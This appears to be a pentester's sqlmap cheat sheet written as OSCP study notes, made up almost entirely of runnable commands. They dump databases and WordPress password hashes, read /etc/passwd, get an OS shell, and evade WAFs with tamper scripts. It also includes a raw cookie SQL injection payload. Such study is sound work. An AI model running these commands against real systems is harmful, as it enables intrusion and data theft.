# Sqlmap

| [https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap) |
| ---------------------------------------------------------------------------------------------------------------------------------- |
| [https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)                           |
| [https://wiki.owasp.org/index.php/Automated\_Audit\_using\_SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)  |

{% hint style="info" %}
Tips: practice with sqlmap to understand attacks and replicate them manually since it is not allowed on OSCP.
{% endhint %}

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash"># To find quicker injections (time-based are slower)
sqlmap -r req --batch --technique BEA --level 5 --risk 3 
# Find write privileges (privilege to write files on the target)
sqlmap -r request -p o --privileges
echo "this is a test" > test
sqlmap -r request -p o --file-write test --file-dest /tmp/mytest
sqlmap -r req --file-read=/etc/passwd --threads 10 # threads only for non-timed injections
<strong>
</strong># If we don't want any slow queries we will remove T and Q and instead use BEUS as our potential techniques. Furthermore we want to increase the level and risk of the testing, to make sure any techniques are properly identified.
sqlmap -u http://$IP/file.php?param=sth --data="user=abc&#x26;pass=abc" -p user --level 5 --risk 3 --technique=BEUS --batch
sqlmap -u http://$IP/file.php?param=sth --data="user=abc&#x26;pass=abc" -p user --privileges
<strong>
</strong><strong># ENUMERATE THE DATABASE
</strong>sqlmap --batch -r request.txt --dbs
# ENUMERATE TABLES
........ -D $database --tables
# ENUMERATE COLUMNS
........ -D $database -T $table --columns
# DUMP SPECIFIC COLUMNS
....... -D $database -T $table -C column1,column2,column3 --dump
# GET OS SHELL
....... --os-shell
# BYPASS WAF
sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1' --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
# HEADERS
sqlmap  -u http://sqhell.thm --headers="X-forwarded-for:1*" --dbms mysql
# SEE THE FULL QUERY
sqlmap –u "http://localhost/test/vuln.aspx?album=1465"
       –-sql-query="select info from information_schema.processlist"


sqlmap -u http://$IP/file.php?user=1 -p user
?user=1 -p user --dump
sqlmap -r request.txt -p id --os-shell --web-root "/var/www/html/" # web-root is where to upload the malicious file to execute commands

sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell

# CUSTOM INJECTION
sqlmap -u "http://www.site.com/?page_id=4&#x26;cid=1&#x26;show=1" -p "show" --technique=B --dbms=mysql --sql-query="select user_login,user_pass from wp_users"
# Available techniques:
B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries
         
# Command examples:
https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
# All-in-one cheat sheet:
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
# First intercept the request with Burp (login page, search bar, etc.)
# Save this request into a text file. We can then pass this into SQLMap to use our authenticated user 
sqlmap -r request.txt --dbms=mysql --dump

# WITH COOKIE
# If the cookie PoC is
["84')) OR 1=2 UNION ALL SELECT 1,2,@@version,4#"]
# Change the cookie of your request.txt with * to mark the injection point:
cookie=["84')) OR 1=2 *#"]
# Now we can feed sqlmap
sqlmap -r request
# Do it manually to not skip the injection point and the cookie analysis

sqlmap -u http://10.10.143.130:5000/challenge3/login --data="username=admin&#x26;password=admin" 
--level=5 --risk=3 --dbms=sqlite --technique=b --dump

# Enconding function // custom script
https://dharma-adiputra.medium.com/playing-with-sqlmap-tamper-script-9c008798190f 
--tamper=mytamper
Tamper scripts are useful when just a part of the parameter is vulnerable and if we want to evade FW/IDS
--force-ssl # in case we are attacking HTTPS

</code></pre>
